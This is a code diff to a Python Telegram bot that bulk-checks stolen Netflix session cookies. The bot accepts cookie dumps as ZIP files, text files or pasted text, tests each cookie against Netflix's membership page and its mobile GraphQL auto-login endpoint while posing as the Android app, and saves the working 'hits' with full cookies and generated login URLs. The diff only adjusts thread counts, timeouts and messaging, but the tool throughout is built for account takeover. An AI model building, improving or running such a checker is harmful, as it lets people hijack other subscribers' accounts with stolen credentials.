@@ -20,10 +20,10 @@ if not BOT_TOKEN:
     print("❌ BOT_TOKEN not set!")
     exit(1)
 
-bot = telebot.TeleBot(BOT_TOKEN)
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
 
 class NetflixBulkChecker:
-    def __init__(self, threads=10):
+    def __init__(self, threads=8):
         self.threads = threads
         self.lock = threading.Lock()
         self.stats = {'total':0, 'checked':0, 'hits':0, 'bad':0, 'errors':0, 'start_time':time.time()}
@@ -32,9 +32,7 @@ class NetflixBulkChecker:
 
     def send_telegram(self, message):
         try:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-            data = {'chat_id': self.chat_id, 'text': message, 'parse_mode': 'HTML', 'disable_web_page_preview': True}
-            requests.post(url, data=data, timeout=10)
+            bot.send_message(self.chat_id, message, disable_web_page_preview=True)
         except:
             pass
 
@@ -64,7 +62,7 @@ class NetflixBulkChecker:
             payload = {"operationName": "CreateAutoLoginToken", "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"}, "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}}
             headers = {'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)', 'Accept': 'application/json', 'Content-Type': 'application/json'}
             
-            response = session.post('https://android13.prod.ftl.netflix.com/graphql', headers=headers, json=payload, timeout=15)
+            response = session.post('https://android13.prod.ftl.netflix.com/graphql', headers=headers, json=payload, timeout=20)
             if response.status_code == 200:
                 data = response.json()
                 if data.get('data', {}).get('createAutoLoginToken'):
@@ -82,7 +80,7 @@ class NetflixBulkChecker:
             for k, v in cookies.items():
                 session.cookies.set(k, v, domain='.netflix.com', path='/')
 
-            r = session.get('https://www.netflix.com/account/membership', timeout=20, allow_redirects=True)
+            r = session.get('https://www.netflix.com/account/membership', timeout=25, allow_redirects=True)
             if 'login' in r.url.lower(): return None
 
             html = r.text
@@ -142,7 +140,6 @@ class NetflixBulkChecker:
                     f.write("--- FULL COOKIE ---\n")
                     f.write(result['cookie'])
 
-                # NO Telegram message for hits
                 print(f"\n{Fore.GREEN}[✓] HIT #{self.stats['hits']} Saved → {fname}{Style.RESET_ALL}")
 
             else:
@@ -165,7 +162,7 @@ class NetflixBulkChecker:
 # ====================== BOT ======================
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
-    bot.reply_to(message, "📤 Send **ZIP**, **single .txt file**, or paste cookie directly.")
+    bot.reply_to(message, "📤 Send **ZIP** or **single .txt file** or paste cookie directly.")
 
 @bot.message_handler(content_types=['document'])
 def handle_file(message):
@@ -198,7 +195,7 @@ def handle_file(message):
                 txt_path = os.path.join(tmp, file_name)
                 with open(txt_path, "wb") as f: f.write(downloaded)
 
-            checker = NetflixBulkChecker(threads=10)
+            checker = NetflixBulkChecker(threads=8)
             checker.chat_id = str(message.chat.id)
             checker.start(extract_dir)
 
@@ -215,9 +212,9 @@ def handle_file(message):
                 bot.reply_to(message, "❌ No hits found.")
 
     except Exception as e:
-        bot.reply_to(message, f"Error: {str(e)}")
+        bot.reply_to(message, f"Error: {str(e)[:200]}")
 
-# ====================== DIRECT COOKIE IN CHAT ======================
+# ====================== DIRECT COOKIE TEXT ======================
 @bot.message_handler(func=lambda m: True)
 def handle_direct_cookie(message):
     text = message.text.strip()
@@ -247,7 +244,6 @@ def handle_direct_cookie(message):
                 f.write(f"Login URL: {result['login_url']}\n\n")
                 f.write("--- FULL COOKIE ---\n")
                 f.write(result['cookie'])
-
         else:
             bot.reply_to(message, "❌ Invalid or Dead Cookie")
 
